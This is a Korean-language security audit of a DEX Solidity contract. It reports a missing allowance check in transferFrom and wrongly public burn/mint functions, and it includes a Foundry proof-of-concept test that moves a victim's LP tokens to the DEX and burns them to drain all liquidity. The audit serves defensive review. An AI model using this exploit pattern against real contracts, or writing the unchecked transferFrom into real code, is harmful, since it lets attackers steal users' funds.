# 1. Unchecked Token allowance to DEX
## Description
- `Dex.sol:transferFrom(L: 147-148)`
`transferFrom`함수는 제 3자가 토큰을 다른사람에게 전송할 수 있도록 하는 함수입니다. 이 때 제 3자는 해당 토큰에 대한 approve가 선행되어있어야 합니다. 그러나 해당 함수에서는 DEX에 대해 LP token을 전송할때 allowance를 검사하지 않고 바로 토큰을 전송시켜주도록 구현되었습니다. 따라서 제 3자가 허용되지 않은 남의 LP token을 DEX 컨트랙트에 전송시킬 수 있습니다.
## Impact
### Critical
다른사람의 자산을 강제로 이동시킬 수 있습니다. 또한 `burn`함수를 살펴보면, DEX 컨트랙트에 현재 남아있는 LP토큰을 소각시켜 호출자에게 소각시킨 만큼의 유동성을 제공하도록 되어있습니다. 따라서 공격자는 모든 LP 토큰을 소각시켜 DEX의 모든 유동성을 탈취할 수 있습니다.
```solidity
    function test_exploitToTransferAndBurn() external {
        uint lp1 = dex.addLiquidity(1000 ether, 1000 ether, 0);
        console.log(dex.balanceOf(address(this))); // 1000000000000000000000
        vm.startPrank(address(1));
        dex.transferFrom(address(this), address(dex), lp1);
        console.log(dex.balanceOf(address(this))); // 0

        (uint x, uint y) = dex.burn(address(1));
        console.log(tokenX.balanceOf(address(1))); // 1000000000000000000000
        console.log(tokenY.balanceOf(address(1))); // 1000000000000000000000
    }
```
## Recommendation
`transferFrom`함수에서 적절하게 allowance를 검증해야 합니다.
# 2. Insufficient Function Modifier
## Description
- `Dex.sol:burn(L: 53-72)`
- `Dex.sol:mint(L: 84-107)`
`burn`함수와 `mint`함수는 각각 `removeLiquidity`함수와 `addLiquidity`함수의 내부함수로써 사용됩니다. 특히 `mint`함수는 단독으로 호출할 경우, `addLiquidity`의 조건문을 우회할 수 있습니다. 불필요한 권한을 최소화하도록 조치를 취하여야 합니다.
## Impact
### low
이 함수만으로 치명적인 자산탈취를 일으킬 순 없지만, 다른 취약점과 결합되었을 경우 큰 문제점을 야기할 수 있습니다. 불필요한 접근을 차단하여 파생될 수 있는 취약점을 최소화 하는 것이 바람직합니다.
## Recommendation
`internal` 또는 `private` 함수로 수정하는 것을 권장합니다.
